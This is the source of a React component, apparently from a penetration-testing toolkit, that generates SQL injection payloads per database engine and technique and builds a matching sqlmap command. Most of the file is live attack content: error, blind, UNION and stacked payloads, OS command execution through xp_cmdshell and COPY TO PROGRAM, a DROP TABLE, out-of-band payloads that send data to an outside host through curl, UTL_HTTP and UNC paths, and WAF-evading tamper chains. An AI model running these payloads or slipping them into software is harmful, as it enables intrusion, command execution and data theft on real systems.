import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CodeBlock,
  CopyChip,
  DownloadButton,
  SectionTitle,
  Select,
  TextInput,
} from '@/components/ui';
import { DEFAULT_OOB_DOMAIN, DEFAULT_TARGET } from '@/tools/registry';

type Dbms = 'mysql' | 'mssql' | 'postgres' | 'oracle' | 'sqlite' | 'generic';
type Point = 'string' | 'numeric' | 'orderby' | 'limit' | 'json';
type Tech = 'error' | 'boolean' | 'time' | 'union' | 'stacked' | 'oob';

const DBMS = [
  { value: 'mysql', label: 'MySQL / MariaDB' },
  { value: 'mssql', label: 'MSSQL' },
  { value: 'postgres', label: 'PostgreSQL' },
  { value: 'oracle', label: 'Oracle' },
  { value: 'sqlite', label: 'SQLite' },
  { value: 'generic', label: 'Generic' },
] as const;

const POINTS = [
  { value: 'string', label: "String ('abc')" },
  { value: 'numeric', label: 'Numeric (123)' },
  { value: 'orderby', label: 'ORDER BY' },
  { value: 'limit', label: 'LIMIT / TOP' },
  { value: 'json', label: 'JSON path' },
] as const;

const TECH_FLAG: Record<Tech, string> = { error: 'E', boolean: 'B', time: 'T', union: 'U', stacked: 'S', oob: 'Q' };

const TECHS: Array<{ value: Tech; label: string }> = [
  { value: 'error', label: 'Error-based' },
  { value: 'boolean', label: 'Boolean blind' },
  { value: 'time', label: 'Time blind' },
  { value: 'union', label: 'UNION' },
  { value: 'stacked', label: 'Stacked' },
  { value: 'oob', label: 'Out-of-band' },
];

/** Comment tail + quote prefix per DBMS / injection point. */
function frame(dbms: Dbms, point: Point): { pre: string; post: string } {
  const post =
    dbms === 'mssql' ? '--' : dbms === 'oracle' ? '/*' : dbms === 'sqlite' ? ' -- ' : '-- -';
  switch (point) {
    case 'numeric':
    case 'orderby':
    case 'limit':
      return { pre: dbms === 'oracle' ? '' : ' ', post };
    case 'json':
      return { pre: `' OR 1=1 ${post}`, post: '' };
    default:
      return { pre: `'`, post };
  }
}

function build(dbms: Dbms, point: Point, tech: Tech, host: string): string[] {
  const { pre, post } = frame(dbms, point);
  const wrap = (cond: string) => `${pre}${cond}${post}`;
  const out: string[] = [];

  if (tech === 'error') {
    if (dbms === 'mysql' || dbms === 'generic') {
      out.push(wrap(` AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))`));
      out.push(wrap(` AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)`));
      out.push(wrap(` AND (SELECT 1 FROM(SELECT COUNT(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)`));
    } else if (dbms === 'mssql') {
      out.push(wrap(` AND 1=CONVERT(int,(SELECT @@version))`));
      out.push(wrap(` AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))`));
    } else if (dbms === 'postgres') {
      out.push(wrap(` AND 1=CAST((SELECT version()) AS int)`));
      out.push(wrap(` AND 1=(SELECT 1/0)`));
    } else if (dbms === 'oracle') {
      out.push(wrap(` AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))`));
      out.push(wrap(` AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))`));
    } else if (dbms === 'sqlite') {
      out.push(wrap(` AND 1=CAST((SELECT sqlite_version()) AS int)`));
    }
  }

  if (tech === 'boolean') {
    out.push(wrap(` AND 1=1`), wrap(` AND 1=2`));
    out.push(wrap(` AND 'a'='a`), wrap(` AND 'a'='b`));
    out.push(wrap(` AND (SELECT SUBSTR(${dbms === 'mssql' ? 'DB_NAME()' : 'database()'},1,1))='${dbms === 'sqlite' ? 'm' : 'a'}'`));
    if (dbms === 'mssql') out.push(wrap(` AND SUBSTRING(@@version,1,1)='M'`));
    out.push(wrap(` AND ASCII(SUBSTRING(COALESCE(${dbms === 'postgres' ? 'current_database()' : 'database()'},'a'),1,1))>64`));
  }

  if (tech === 'time') {
    if (dbms === 'mysql' || dbms === 'generic') out.push(wrap(` AND SLEEP(5)`), wrap(` AND BENCHMARK(5000000,MD5(1))`));
    else if (dbms === 'mssql') out.push(wrap(`; WAITFOR DELAY '0:0:5'`), wrap(` AND 1=1; WAITFOR DELAY '0:0:5'`));
    else if (dbms === 'postgres' || dbms === 'sqlite') out.push(wrap(` AND 1=(SELECT 1 FROM pg_sleep(5))`));
    else if (dbms === 'oracle') out.push(wrap(` AND 1=(SELECT COUNT(*) FROM ALL_USERS a,ALL_USERS b,ALL_USERS c)`));
    out.push(wrap(` AND IF(1=1,SLEEP(5),0)`));
    out.push(wrap(` AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END`));
  }

  if (tech === 'union') {
    for (let n = 1; n <= 10; n++) {
      const nulls = Array.from({ length: n }, () => 'NULL').join(',');
      out.push(wrap(` UNION SELECT ${nulls}`));
    }
    const fn = dbms === 'mssql' ? '@@version' : dbms === 'oracle' ? 'banner FROM v$version' : 'version()';
    out.push(wrap(` UNION SELECT ${fn}${',NULL'.repeat(4)}`));
  }

  if (tech === 'stacked') {
    if (dbms === 'mssql') out.push(wrap(`; EXEC xp_cmdshell 'whoami'`), wrap(`; SELECT * FROM OPENROWSET('SQLNCLI','x','x')`));
    else if (dbms === 'mysql') out.push(wrap(`; DROP TABLE IF EXISTS probe_tmp`), wrap(`; SELECT SLEEP(5)`));
    else if (dbms === 'postgres') out.push(wrap(`; COPY (SELECT version()) TO PROGRAM 'id'`), wrap(`; CREATE TABLE p(x int)`));
    else if (dbms === 'oracle') out.push(wrap(`; BEGIN NULL; END;`));
    else out.push(wrap(`; SELECT 1`));
  }

  if (tech === 'oob') {
    if (dbms === 'mssql') out.push(wrap(`; EXEC master..xp_dirtree '\\\\${host}\\share'`), wrap(`; DECLARE @q VARCHAR(99);SET @q='\\\\${host}\\x';EXEC master.dbo.xp_fileexist @q`));
    else if (dbms === 'oracle') out.push(wrap(` AND 1=UTL_HTTP.REQUEST('http://${host}/x')`), wrap(` AND 1=UTL_INADDR.GET_HOST_ADDRESS('${host}')`));
    else if (dbms === 'postgres') out.push(wrap(`; COPY (SELECT '') TO PROGRAM 'curl http://${host}/x'`));
    else out.push(wrap(` AND LOAD_FILE('\\\\\\\\${host}\\\\x')`), wrap(` AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.${host}\\\\a')))`));
  }
  return out;
}

export default function SqlInjectionBuilder() {
  const [dbms, setDbms] = useState<Dbms>('mysql');
  const [point, setPoint] = useState<Point>('string');
  const [techs, setTechs] = useState<Tech[]>(['boolean', 'time', 'union', 'error']);
  const [host, setHost] = useState(DEFAULT_OOB_DOMAIN);
  const [url, setUrl] = useState(`https://${DEFAULT_TARGET}/search?q=test`);
  const [param, setParam] = useState('q');
  const [level, setLevel] = useState<'1' | '3' | '5'>('3');
  const [tamper, setTamper] = useState(true);

  const sections = useMemo(() => {
    const h = host.trim() || DEFAULT_OOB_DOMAIN;
    return TECHS.filter((t) => techs.includes(t.value)).map((t) => ({
      ...t,
      items: build(dbms, point, t.value, h),
    }));
  }, [dbms, point, techs, host]);

  const flat = useMemo(
    () => sections.map((s) => [`# ${s.label}`, ...s.items, ''].join('\n')).join('\n'),
    [sections],
  );

  const sqlmap = useMemo(() => {
    if (!url.trim()) return '';
    const tamperList =
      dbms === 'mssql'
        ? 'space2comment,charencode,randomcase'
        : dbms === 'mysql'
          ? 'space2comment,between,randomcase,versionedkeywords'
          : 'space2comment,equaltolike,randomcase,charunicodeencode';
    return [
      `sqlmap -u '${url}' -p ${param.trim() || 'q'} \\`,
      `  --dbms=${dbms === 'generic' ? 'MySQL' : dbms.toUpperCase()} \\`,
      `  --batch --level=${level} --risk=2 --threads=4 --random-agent \\`,
      tamper ? `  --tamper=${tamperList} \\` : '',
      `  --technique=${techs.map((t) => TECH_FLAG[t]).join('') || 'BT'}`,
      `  --output-dir=./sqlmap-out`,
    ]
      .filter(Boolean)
      .join('\n');
  }, [url, param, dbms, level, tamper, techs]);

  const toggleTech = (t: Tech, on: boolean) =>
    setTechs((prev) => (on ? [...prev, t] : prev.filter((x) => x !== t)));

  return (
    <>
      <Card title="Target & technique">
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          <Select label="DBMS" value={dbms} onChange={setDbms} options={DBMS.map((d) => ({ value: d.value, label: d.label }))} />
          <Select label="Injection point" value={point} onChange={setPoint} options={POINTS.map((p) => ({ value: p.value, label: p.label }))} />
          <TextInput label="OAST domain" value={host} onChange={setHost} mono hint="Used by out-of-band variants" />
          <TextInput label="Request URL" value={url} onChange={setUrl} mono hint="Used for the sqlmap card" />
          <TextInput label="Parameter" value={param} onChange={setParam} mono />
          <Select
            label="sqlmap level"
            value={level}
            onChange={setLevel}
            options={[
              { value: '1', label: '1 — fast' },
              { value: '3', label: '3 — balanced' },
              { value: '5', label: '5 — exhaustive' },
            ]}
          />
        </div>
        <div className="mt-4">
          <SectionTitle>Techniques</SectionTitle>
          <div className="grid gap-2 sm:grid-cols-3 lg:grid-cols-6">
            {TECHS.map((t) => (
              <Checkbox key={t.value} checked={techs.includes(t.value)} onChange={(on) => toggleTech(t.value, on)} label={t.label} />
            ))}
          </div>
          <div className="mt-3">
            <Checkbox
              checked={tamper}
              onChange={setTamper}
              label="Suggest tamper scripts"
              description="Emit a tamper chain matched to the selected DBMS"
            />
          </div>
        </div>
      </Card>

      <Card
        title="Payloads"
        action={<DownloadButton text={flat} filename="sqli-payloads.txt" label="Download .txt" />}
      >
        {sections.length === 0 ? (
          <Callout tone="info" title="No technique selected">Choose at least one technique above.</Callout>
        ) : (
          <div className="flex flex-col gap-5">
            {sections.map((s) => (
              <div key={s.value}>
                <SectionTitle right={<span className="text-[11.5px] text-[var(--text-faint)]">{s.items.length} variants</span>}>
                  {s.label}
                </SectionTitle>
                <div className="flex flex-col gap-1.5">
                  {s.items.map((p, i) => (
                    <div key={i} className="flex items-center gap-2">
                      <CopyChip text={p} />
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        )}
      </Card>

      <Card title="Automation">
        <CodeBlock code={sqlmap} label="sqlmap command" />
        <div className="mt-4">
          <Callout tone="warn" title="Reading the ladder">
            Walk the UNION column-count ladder one step at a time: a row with fewer NULLs returns a column-mismatch
            error, and the first count that renders normally is the column total. For blind work, confirm the boolean
            pair (true/false) produces a stable response-length delta before trusting any extracted character.
          </Callout>
        </div>
      </Card>
    </>
  );
}
